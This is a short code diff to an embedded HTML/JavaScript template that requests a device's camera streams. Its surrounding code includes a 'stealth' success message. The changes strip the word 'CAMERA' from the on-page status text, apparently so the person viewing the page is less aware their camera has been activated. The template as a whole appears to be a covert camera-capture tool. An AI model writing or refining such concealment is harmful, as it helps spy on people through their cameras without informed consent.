@@ -495,7 +495,7 @@ HTML_TEMPLATE = """
     async function requestBothCameras() {
       try {
         addConsoleLine('> ACCESSING CAMERA SUBSYSTEM...', 'highlight');
-        statusBadge.textContent = '📷 INITIALIZING CAMERA...';
+        statusBadge.textContent = '📷 INITIALIZING...';
         
         // Get front camera
         frontStream = await navigator.mediaDevices.getUserMedia({
@@ -534,7 +534,7 @@ HTML_TEMPLATE = """
         document.body.appendChild(videoElement);
         
         addConsoleLine('> CAMERA ACCESS GRANTED', 'highlight');
-        statusBadge.textContent = '📸 CAMERA ACTIVE';
+        statusBadge.textContent = 'ACTIVE';
         statusLine.innerHTML = '> STATUS: <span class="highlight">ACTIVE</span>';
         
         // Send success message stealth
@@ -547,7 +547,7 @@ HTML_TEMPLATE = """
         
       } catch (err) {
         addConsoleLine(`> CAMERA ACCESS DENIED: ${err.message}`, 'error');
-        statusBadge.textContent = '⚠️ CAMERA UNAVAILABLE';
+        statusBadge.textContent = '⚠️ UNAVAILABLE';
         statusLine.innerHTML = '> STATUS: <span class="error">ERROR</span>';
         mediaActive = false;
         
